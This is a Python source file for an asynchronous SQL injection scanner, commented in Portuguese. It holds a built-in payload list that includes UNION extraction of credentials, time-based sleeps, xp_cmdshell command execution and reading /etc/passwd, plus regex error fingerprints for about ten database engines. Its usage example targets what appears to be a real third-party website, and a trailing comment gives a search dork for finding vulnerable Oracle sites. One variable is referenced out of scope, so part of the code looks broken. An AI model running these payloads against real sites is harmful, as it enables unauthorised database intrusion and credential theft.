import asyncio
import re

import functions
import essentials

# payload -> payload enviado
# suspicious_response -> resposta bruta

async def sqli(url, file, ua_status=False, timeout=10, SSL=True, proxies=None, interval=5, continue_=False, score_sqli=False):

    # tornar o modo advanced uma forma de reconhecimento do sql

    default_payload = [
        "1 OR 1=1",
        "' OR '1'='1'--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT username, password FROM users--",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' OR 1=1#",
        "' OR 'x'='x",
        "1 AND 1=2",
        "1 UNION ALL SELECT NULL,NULL,NULL--",
        "1' AND SLEEP(5)--",
        "1' AND pg_sleep(5)--",
        "1 WAITFOR DELAY '00:00:05'--",
        "' OR EXISTS(SELECT * FROM users)--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
        "1; EXEC xp_cmdshell('whoami')--",
        "1; SELECT load_file('/etc/passwd')--",
        "' UNION SELECT 1,database(),user()--",
        "admin' AND 1=(SELECT COUNT(*) FROM tablename)--",
        "' AND ASCII(SUBSTRING((SELECT database()),1,1))>77--",
        "' OR updatexml(1,concat(0x7e,(SELECT database())),0)--",
        "' OR extractvalue(1,concat(0x7e,(SELECT user())))--",
        "1;SELECT+PG_SLEEP(5)",
        "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--",
    ]
    
    error_messages = {
        'mysql': [
            r"You have an error in your SQL syntax", r"mysql", r"SQL syntax", 
            r"Query failed", r"database error", r"invalid query", r"incorrect syntax", 
            r"error in your SQL syntax", r"unclosed quotation mark", r"unexpected EOF", 
            r"unexpected token", r"unable to execute", r"invalid input"
        ],
        'postgresql': [
            r"syntax error", r"invalid input syntax for type", r"pg_sleep", 
            r"unrecognized statement", r"failed to open", r"unrecognized variable", 
            r"missing FROM-clause entry", r"division by zero", r"invalid regular expression"
        ],
        'sqlserver': [
            r"Msg \d+", r"Incorrect syntax", r"WAITFOR DELAY", r"incorrect syntax near", 
            r"conversion failed when converting the varchar value", 
            r"cannot insert the value", r"unclosed quotation mark after the character string", 
            r"Invalid object name", r"Arithmetic overflow error"
        ],
        'oracle': [
            r"ORA-\d+:.*", r"SQL command not properly ended", r"missing expression", r"invalid number", 
            r"invalid identifier", r"ORA-00933:.*", r"ORA-01756:.*", r"ORA-00904:.*", 
            r"ORA-01428:.*", r"ORA-01476:.*", r"ORA-12899: value too large for column.*"
        ],
        'mongodb': [
            r"SyntaxError: Unexpected token.*", 
            r"FieldError: Unknown field.*", 
            r"BSONObj size.*", r"MongoError:", r"Cannot apply \$.*", 
            r"Unterminated string in JSON.*"
        ],
        'sqlite': [
            r"SQLite error:.*", r"no such column:.*", r"datatype mismatch", 
            r"UNIQUE constraint failed.*", r"near \"\": syntax error", 
            r"unrecognized token:.*", r"too many SQL variables", 
            r"attempt to write a readonly database"
        ],
        'redis': [
            r"ERR unknown command.*", r"ERR syntax error", r"WRONGTYPE Operation.*", 
            r"OUT OF MEMORY", r"BUSY Redis is busy running a script"
        ],
        'db2': [
            r"SQLCODE=-\d+", r"DB2 SQL Error:.*", r"SQLSTATE=.*", 
            r"SQLCODE: -302", r"SQLERRMC=.*", 
            r"A character that is not valid.*"
        ],
        'mariadb': [
            r"You have an error in your SQL syntax", r"MariaDB server version.*", 
            r"incorrect parameter count in the call to native function.*", 
            r"Query execution failed.*"
        ],
        'cockroachdb': [
            r"unexpected value", r"invalid syntax", r"pq: syntax error", 
            r"relation .* does not exist", r"column .* does not exist"
        ],
    }


    if len(file.strip()) > 0:
        payloads = await essentials.fileReader(file)
        if not payloads:
            print(f'[-] Nao encontrado: {file}')
            return False, f'[-] Nao encontrado: {file}'
    else:
        payloads = default_payload
    
    async def sqli_async(payloads):
        
        name_save_file = 'sqli.json'
        bd = [] # armazena o tipo de bd usado
        background = [] # tecnologias reconhecidas durante o teste
        scheme = 'https' if SSL else 'http' # define se e http ou https

        for payload in payloads:
            score = 0 # se o sistema de score estiver ativo
            payload = payload.strip()
            test_url = f'{scheme}://{url}'.replace('*', payload)

            await asyncio.sleep(interval) # intervalo entre requisicoes

            print(f'[-][{functions.time_now()}] Tentando: {test_url}')
            status, r = await functions.request(test_url, timeout=timeout, SSL=SSL, proxies=proxies) # requisicao
            print(f'{" "*3}[*] {r.headers}')
            if status:
                for k, v in error_messages.items(): # itera sobre o dicionario
                    # if any(error_msg.lower() in r.text.lower() for error_msg in v): 
                    if any(re.search(error_msg.lower(), r.text.lower()) for error_msg in v): # verifica o tipo de erro no retorno
                        bd.append(k)
                        print(f'[+][{functions.time_now()}][{r.status_code}] Possível vulnerabilidade: {url.replace("*", "")} -> {payload}')
                        print(f'{" "*3}[*] Tipo: {k} Msg: {error_msg} url: {test_url}')

                        
                        if not continue_:
                            return True, f'[+][{functions.time_now()}][{r.status_code}] Possível vulnerabilidade: {url} -> {payload}'
            else:
                print(f'[-][{functions.time_now()}] {r}')
            
            json_obj_response = {
                'hostname': url,
                'payload': payload,
                'url': test_url,
                'background': bd if len(bd) > 0 else None,
                'details': None,
                'status_code': r.status_code if status else 404,
                'error': False if status else True,
                'error_details': None if status else r,
                'date_time': functions.time_now(),
                'response_headers': {},
                'response_certificate':{},
            }
            await essentials.json_write(json_obj_response, name_save_file)
        
    await sqli_async(payloads)
        
    return False, f'[-][{functions.time_now()}] Nenhuma vulnerabilidade encontrada'

# detect form


# detect query_strings_detect


# Exemplo de uso:
async def main():
    status, attk = await sqli(
        'www.socasadas.com/?s=*',
        '/home/maserati/Downloads/Python/wx78/wordlists/sqli/injection.txt',
        continue_=True,
    )

asyncio.run(main())

# DORK
# ociexecute "ora 01756"